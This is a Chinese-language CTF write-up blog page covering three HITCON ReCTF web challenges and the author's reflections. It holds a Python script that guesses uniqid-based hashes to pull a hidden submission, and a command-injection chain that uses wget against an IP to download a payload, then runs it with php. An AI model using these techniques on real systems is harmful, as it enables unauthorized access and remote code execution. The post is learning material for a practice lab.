@@ -1,0 +1,389 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HITCON-2023-ReCTF | FlyFish's Blog</title><meta name="author" content="Fish Yu"><meta name="copyright" content="Fish Yu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="緣由上周被公司派去參加了 hitcon 2023，看到年齡相近的大神們那超高水準的研究以及充滿夢想(?)的眼神後，被激勵到，又燃起 hacker 的熱情了。剛好想到自己有個夢想就是挖洞拿獎金達到財富自由，由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是個鍛鍊挖洞技能的好方法，於是打算如法炮製，試著打打看，看一年後有沒有機會真的變成挖洞高手，挖洞賺大錢。 在這次 hitcon 2023 我玩">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON-2023-ReCTF">
+<meta property="og:url" content="https://sakana.tw/2023/08/27/HITCON-2023-ReCTF/index.html">
+<meta property="og:site_name" content="FlyFish&#39;s Blog">
+<meta property="og:description" content="緣由上周被公司派去參加了 hitcon 2023，看到年齡相近的大神們那超高水準的研究以及充滿夢想(?)的眼神後，被激勵到，又燃起 hacker 的熱情了。剛好想到自己有個夢想就是挖洞拿獎金達到財富自由，由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是個鍛鍊挖洞技能的好方法，於是打算如法炮製，試著打打看，看一年後有沒有機會真的變成挖洞高手，挖洞賺大錢。 在這次 hitcon 2023 我玩">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.sakana.tw/blog/HITCON-2023-ReCTF/cover.jpg">
+<meta property="article:published_time" content="2023-08-27T12:50:27.000Z">
+<meta property="article:modified_time" content="2025-01-27T10:17:38.961Z">
+<meta property="article:author" content="Fish Yu">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.sakana.tw/blog/HITCON-2023-ReCTF/cover.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HITCON-2023-ReCTF",
+  "url": "https://sakana.tw/2023/08/27/HITCON-2023-ReCTF/",
+  "image": "https://files.sakana.tw/blog/HITCON-2023-ReCTF/cover.jpg",
+  "datePublished": "2023-08-27T12:50:27.000Z",
+  "dateModified": "2025-01-27T10:17:38.961Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Fish Yu",
+      "url": "https://sakana.tw/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/dolphin.svg"><link rel="canonical" href="https://sakana.tw/2023/08/27/HITCON-2023-ReCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HITCON-2023-ReCTF',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg" style="background-image: url(url(/images/default_cover.png));"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://files.sakana.tw/blog/Theme/avatar-arona.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><span> Posts</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://files.sakana.tw/blog/HITCON-2023-ReCTF/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">FlyFish's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HITCON-2023-ReCTF</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><span> Posts</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HITCON-2023-ReCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-27T12:50:27.000Z" title="Created 2023-08-27 20:50:27">2023-08-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-27T10:17:38.961Z" title="Updated 2025-01-27 18:17:38">2025-01-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>6mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="緣由"><a href="#緣由" class="headerlink" title="緣由"></a>緣由</h2><p>上周被公司派去參加了 hitcon 2023，看到年齡相近的大神們那超高水準的研究以及充滿夢想(?)的眼神後，被激勵到，又燃起 hacker 的熱情了。<br>剛好想到自己有個夢想就是挖洞拿獎金達到財富自由，由於在台上的講者們都曾是 ctf 王，打 ctf 似乎是個鍛鍊挖洞技能的好方法，於是打算如法炮製，試著打打看，看一年後有沒有機會真的變成挖洞高手，挖洞賺大錢。</p>
+<p>在這次 hitcon 2023 我玩了 devcore wargame 和 rectf，<a href="/2023/09/03/DEVCORE-Wargame-2023/" title="DEVCORE-Wargame-2023">DEVCORE-Wargame-2023</a> 的部分，在活動的兩天內我只解的掉一題水題…(儘管我仍然花了 5 個小時)，rectf 因為開放時間比較久，費盡洪荒之力總算是解了兩題。在這邊放上 writeup 和簡單的心得，記錄一下。</p>
+<h2 id="ReCTF"><a href="#ReCTF" class="headerlink" title="ReCTF"></a>ReCTF</h2><p>顧名思義，這個活動是將從前 hitcon ctf 出過的題目進行復刻。</p>
+<h3 id="papapa"><a href="#papapa" class="headerlink" title="papapa"></a>papapa</h3><blockquote>
+<p>環境：<a target="_blank" rel="noopener" href="https://peterli.website/hitcon-ctf-2016-papapa-%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/">Hitcon-Ctf-2016-Papapa 建置環境</a></p>
+</blockquote>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/papapa-1.png" class="" width="450" title="挖勒">
+<p>一進來頁面就長這樣，啥 input 都沒有，看了 cookie 感覺也沒能控制的點，我無言了…。<br>通靈了一下子，決定爬文搜 papapa ctf，發現是 hitcon 2016 時 orange 出的題目(<a target="_blank" rel="noopener" href="https://peterli.website/hitcon-ctf-2016-papapa-%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/">連結</a>)，並翻了 orange github 的出題 src，原來解題的關鍵在憑證…。</p>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/papapa-2.png" class="" width="450">
+
+<p>直接 burpsuite 改 host，拿到 flag <code>FLAG&#123;Nw_u_F0un6_myh05t&#125;</code></p>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/papapa-3.png" class="" width="450">
+
+<p>但其實這 flag 傳上去是錯的，窩操，傻住了一下，搞不好是藏在其他頁，重新走整個流程再試一次。</p>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/papapa-4.png" class="" width="450">
+<p>這次真的拿到了 <code>hitcon&#123;n0w_4y_h4v3_th3_f14g&#125;</code>，原來 flag 不是在 <code>/index.html</code> 是在 <code>/</code>，還好不是藏很深(呼氣)。</p>
+<h3 id="yeeclass"><a href="#yeeclass" class="headerlink" title="yeeclass"></a>yeeclass</h3><blockquote>
+<p>環境：附上 <a target="_blank" rel="noopener" href="https://github.com/t510599/My-CTF-Challenges/tree/master/HITCON%20CTF/2022/yeeclass">docker-compose</a></p>
+</blockquote>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/yeeclass-1.png" class="" width="450">
+<p>這個題目很佛心的給了你整個 source 包括 docker compose，所以只要 trace code 就好，<br>我原本是這樣想的…，但我前一小時真的看不出洞。<br>本以為是打 sql injection，但整份 code 都使用 POD execute，應該不是這問題。<br>後來才發現，submission.php 中有一個判斷失誤，<code>PERM_TA</code> 為 1，<code>_SESSION</code>不存在時，其在 boolean 的判斷會當成 0 的樣子，可以繞過拿到 FLAG 的清單 (<code>homework=1</code>)</p>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/yeeclass-2.png" class="" width="450">
+
+<p>於是我把 cookie 清掉再讀一次網頁，繞過了，可惜這邊還是看不到 flag 內容</p>
+<img src="https://files.sakana.tw/blog/HITCON-2023-ReCTF/yeeclass-3.png" class="" width="450">
+
+<p>同時 submission.php 中看到了這一段，我突發奇想: “是不是有辦法 userclass 沒設定但 userid 設定成 <code>flagholder</code>“，這樣我就有拿的到 hash 去存取 flag 頁面了？！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;userid&quot;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&quot;userclass&quot;</span>] &gt;= PERM_TA) || <span class="variable">$row</span>[<span class="string">&quot;userid&quot;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&quot;userid&quot;</span>]) &#123; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;td&gt;&lt;a href=<span class="string">&quot;submission.php?hash=&lt;?= <span class="subst">$row</span>[&#x27;hash&#x27;] ?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span> <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] <span class="meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+<p>於是我轉向 <code>index.php</code>，查了一堆資料想了各種可能 (e.g. HPP、race condition)，想破頭了覺得沒辦法做到。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 邏輯大概是這樣，一氣呵成，看不出破綻</span></span><br><span class="line">    <span class="variable">$login_query</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM user WHERE username=?&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$login_query</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;userid&quot;</span>] = <span class="variable">$result</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$result</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;userclass&quot;</span>] = <span class="variable">$result</span>[<span class="string">&quot;class&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>最後我破防了，去看出題者的說明，發現要利用 uniuid 直接拿時間戳產生的特性，推出當初用來算 hash 的 uid，學到了…，因為從上一步的繞過，我得到了 flag 的提交時間，可以寫 exploit 了。<br>exploit 基本上就是參考 php source uniuid 的寫法，其他比較花時間的部分，大概就是想辦法把日期時間轉換成 unixtimestamp 並且 parse 成對應格式，以及一些 POC 的基本驗證了 (我一開始還 parse 錯)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># target url</span></span><br><span class="line">url = <span class="string">&#x27;rectf.hitcon2023.online&#x27;</span></span><br><span class="line"><span class="comment"># The flag submission time</span></span><br><span class="line">sec = <span class="number">1692158975</span></span><br><span class="line">usec = <span class="number">584096</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    flag_submit_id = <span class="string">f&quot;flagholder_<span class="subst">&#123;sec:x&#125;</span><span class="subst">&#123;usec-i:x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha1(flag_submit_id.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Testing <span class="subst">&#123;flag_submit_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    conn = http.client.HTTPConnection(url, <span class="number">30203</span>)</span><br><span class="line">    <span class="comment"># conn = http.client.HTTPConnection(url, 8210)</span></span><br><span class="line">    conn.request(<span class="string">&#x27;GET&#x27;</span>,<span class="string">f&#x27;/submission.php?hash=<span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&#x27;</span>)</span><br><span class="line">    r2 = conn.getresponse()</span><br><span class="line">    data2 = r2.read()</span><br><span class="line">    <span class="keyword">if</span>(data2 != <span class="string">b&#x27;Submission not found.&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Successfully get flag with <span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(data2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>
+<p>Reference:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stoneapp.tech/cavern/post.php?pid=948">https://stoneapp.tech/cavern/post.php?pid=948</a></li>
+</ul>
+<h3 id="babyfirst"><a href="#babyfirst" class="headerlink" title="babyfirst"></a>babyfirst</h3><blockquote>
+<p>環境: <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2015/babyfirst">babyfirst</a> (至於當時環境的 php 版本我用 wappalyzer 看記得是 7.1.34，但我想用啥版本都影響不大，反正我用 8.1 好像還是一樣可以打)</p>
+</blockquote>
+<script src="https://gist.github.com/orangetw/cb3487e47d7aaaea4692.js"></script>
+<p>(應該沒人認真看這篇，我偷偷 host orange 的 gist 應該不會有人發現吧？)</p>
+<p>找資料發現 <code>preg_match</code> 有個 <code>\n</code> 的 mismatch 洞之後，測了一兩個小時，<br>確定只能這樣串 <code>$args = [&#39;AAA\n&#39;,&#39;mycmd&#39;,&#39;my parameter\n&#39;,&#39;mycmd&#39;]</code>，沒其他特殊字元可以繞過了。</p>
+<p>串指令的路線</p>
+<ol>
+<li>寫入 base64 檔案 + decode base64 檔案 + 執行檔案<ul>
+<li>如何寫入？狗到的方式都是 <code>echo xxx &gt; file</code>，有 <code>&gt;</code></li>
+<li><code>base64 -decode</code> 有 <code>-</code></li>
+</ul>
+</li>
+<li>下載檔案 + 執行檔案<ul>
+<li>如何下載？首先 ip <code>xxx.xxx.xxx.xxx</code> 就有 <code>.</code></li>
+</ul>
+</li>
+</ol>
+<p>感覺都不行，我低下的想像力不知道怎麼辦了。偷偷看了一下 orange 的 writeup，確定 wget 可以。於是我又想了一個小時，靈機一動 ip 有 decimal 形式，<code>wget 2130706433(127.0.0.1)</code>成功下載檔案。<br>但 <code>wget</code> 抓下來的檔名是 <code>index.html</code>，就算 302 轉向到別的網頁還是一樣。又卡住了 QQ。<br>爬文幾乎每篇講 linux 下載檔案的，都是用 curl、wget。而 curl 也是會用到特殊符號。mv 也要輸入檔案名 <code>index.html</code></p>
+<p>在爬了一個多小時的文之後，果斷去看 writeup🥹。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir orange</span><br><span class="line">cd orange</span><br><span class="line">wget HEXED_IP</span><br><span class="line">tar cvf payload orange</span><br><span class="line">php payload</span><br></pre></td></tr></table></figure>
+<p>看了我還是不懂，php 怎麼可能執行 tar 後的檔案，實際試了一次後，shit，還真的可以直接執行😱，為什麼會有這種 feature？！</p>
+<p>除此之外還有</p>
+<ul>
+<li>wget 302 重導向到 ftp，可以解決 index.html 預設檔名的問題。</li>
+<li>busybox ftpget</li>
+<li>twistd telnet</li>
+</ul>
+<p>這些解法確實是超出我的理解範圍了。</p>
+<p>Reference:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97">https://kb.hitcon.org/post/131488130087/hitcon-ctf-2015-quals-web-%E5%87%BA%E9%A1%8C%E5%BF%83%E5%BE%97</a></li>
+</ul>
+<h3 id="其他題"><a href="#其他題" class="headerlink" title="其他題"></a>其他題</h3><p>其他題我還沒打，網站就關了，88。</p>
+<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3><h4 id="papapa-1"><a href="#papapa-1" class="headerlink" title="papapa"></a>papapa</h4><p>資訊收集的部分要再細心一點，都用 nmap 去掃這網站的 ip 了，卻沒注意到憑證這個部分。<br>另外意外的收穫就是從 orange 架這題目的 src，學到了 apache 的 virtual host 這個 feature，<br>原來有這種酷東西，感覺架網站時很有用，並且底層是檢查 http header 中的 <code>host:</code> 進行轉送的。<br>Reference:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#papapa">https://github.com/orangetw/My-CTF-Web-Challenges#papapa</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/milenovo/1698875">https://blog.51cto.com/milenovo/1698875</a></li>
+<li><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/vhosts/name-based.html">https://httpd.apache.org/docs/2.4/vhosts/name-based.html</a></li>
+</ul>
+<h4 id="yeeclass-1"><a href="#yeeclass-1" class="headerlink" title="yeeclass"></a>yeeclass</h4><p>這一個我感覺就差一點，我因為原本的想法失敗就放棄了，但我認為我是有能力觀察到 uniuid 那邊的貓膩的，<br>這邊沒有堅持住，搥牆，要改進才行。<br>在說做不到之前，必須好好確認是不是還有其他可以利用的線索還沒觀察到的。</p>
+<h4 id="babyfirst-1"><a href="#babyfirst-1" class="headerlink" title="babyfirst"></a>babyfirst</h4><p>看完 writeup 後，我難得慶幸還好我有看，因為我真的想不出來這幾招…學到了。<br>可能也是因為我對 linux 的 coreutils 太不熟了，希望未來會改善。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://files.sakana.tw/blog/HITCON-2023-ReCTF/cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2023/09/03/DEVCORE-Wargame-2023/" title="DEVCORE-Wargame-2023"><img class="cover" src="/images/star_flower_clip.jpg" onerror="onerror=null;src='/images/crying_chopper.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">DEVCORE-Wargame-2023</div></div><div class="info-2"><div class="info-item-1">first-flag(有點忘記，應該是叫這名子沒錯)隨便輸入一串 user，登入後會要你輸入 flag，超過 5 分會給你這一題的 flag   (搞笑的是我一開始以為 flag 是 FLAG&#123;this_is_the_first_flag&#125;，拿去輸入想說怎麼是錯的) 看 session，感覺有點東西，於是 base64 decode，嗯？感覺 exp 可以用。 123456789100...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2023/09/03/DEVCORE-Wargame-2023/" title="DEVCORE-Wargame-2023"><img class="cover" src="/images/star_flower_clip.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-03</div><div class="info-item-2">DEVCORE-Wargame-2023</div></div><div class="info-2"><div class="info-item-1">first-flag(有點忘記，應該是叫這名子沒錯)隨便輸入一串 user，登入後會要你輸入 flag，超過 5 分會給你這一題的 flag   (搞笑的是我一開始以為 flag 是 FLAG&#123;this_is_the_first_flag&#125;，拿去輸入想說怎麼是錯的) 看 session，感覺有點東西，於是 base64 decode，嗯？感覺 exp 可以用。 123456789100...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div><div class="comment-switch"><span class="first-comment">Giscus</span><span id="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B7%A3%E7%94%B1"><span class="toc-number">1.</span> <span class="toc-text">緣由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReCTF"><span class="toc-number">2.</span> <span class="toc-text">ReCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#papapa"><span class="toc-number">2.1.</span> <span class="toc-text">papapa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yeeclass"><span class="toc-number">2.2.</span> <span class="toc-text">yeeclass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyfirst"><span class="toc-number">2.3.</span> <span class="toc-text">babyfirst</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">其他題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%83%E5%BE%97"><span class="toc-number">2.5.</span> <span class="toc-text">心得</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#papapa-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">papapa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#yeeclass-1"><span class="toc-number">2.5.2.</span> <span class="toc-text">yeeclass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyfirst-1"><span class="toc-number">2.5.3.</span> <span class="toc-text">babyfirst</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Fish Yu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span 